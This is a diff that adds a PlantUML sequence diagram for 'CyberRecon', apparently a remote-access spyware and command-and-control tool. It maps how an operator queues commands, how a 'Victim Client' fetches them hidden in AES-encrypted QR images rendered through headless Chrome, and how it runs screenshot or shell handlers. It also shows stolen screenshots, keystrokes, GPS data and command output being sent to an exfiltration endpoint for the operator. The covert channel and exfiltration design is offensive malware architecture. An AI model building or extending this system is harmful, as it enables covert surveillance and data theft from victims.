@@ -1,0 +1,59 @@
+@startuml
+skinparam packageStyle rectangle
+skinparam actorStyle awesome
+title CyberRecon — Sequence Diagram — Command Flow (v3.5)
+
+actor "Operator\n(browser)" as OP
+participant "C2 Server" as C2
+participant "QR Channel" as QC
+participant "Victim Client" as VC
+participant "Headless\nChrome" as CH
+participant "Command Handler" as H
+participant "Exfil Endpoint" as EX
+
+== Phase 1 — Operator login (session cookie) ==
+OP -> C2 : POST /login\n{password}
+C2 -> C2 : compare_digest(password,\nCYBERRECON_DASHBOARD_PASSWORD)
+C2 -> C2 : session.clear()\nsession["logged_in"]=True
+C2 --> OP : Set-Cookie: session\n(HttpOnly, Secure, SameSite=Lax)
+
+== Phase 2 — Operator queues command ==
+OP -> C2 : POST /command/<id>\nCookie: session\nX-Operator-Token: ...
+C2 -> C2 : @require_dashboard_login
+C2 -> C2 : @require_operator_token
+C2 -> C2 : queue_command\n(id=secrets.token_hex)
+C2 --> OP : 200 queued
+
+== Phase 3 — Victim polls for command (loop) ==
+loop Poll every N seconds
+    VC -> C2 : GET /qr/<id>?vkey=...\nX-Victim-Key: ...
+    C2 -> C2 : @require_victim_key
+    C2 -> QC : encode_command_to_qr
+    QC -> QC : protect_payload\n(AES-256-GCM encrypt)
+    QC -> QC : qrcode.make + resize
+    QC --> VC : image/png
+    VC -> CH : driver.get(/qr/<id>)
+    CH -> CH : render QR as pixels
+    CH --> VC : screenshot PNG
+    VC -> VC : cv2.QRCodeDetector\ndecode
+    VC -> VC : unprotect_payload\n(AES-256-GCM decrypt)
+end
+
+== Phase 4 — Victim executes ==
+VC -> H : execute_command\n{cmd, args, id}
+H -> H : run handler\n(screenshot, shell, ...)
+H -> EX : POST /exfil/<id>\nX-Victim-Key: ...\n{type, data}
+EX -> C2 : store_exfil
+C2 --> EX : 200 received
+
+== Phase 5 — Victim ACKs ==
+VC -> C2 : POST /ack/<id>\nX-Victim-Key: ...\n{id: cmd_id}
+C2 -> C2 : remove cmd_id from queue
+C2 --> VC : 200 acked
+
+== Phase 6 — Operator views exfil ==
+OP -> C2 : GET /exfil-data/<id>\nCookie: session
+C2 -> C2 : @require_dashboard_login
+C2 --> OP : JSON payload\n(screenshots, keystrokes,\nGPS, command outputs)
+
+@enduml
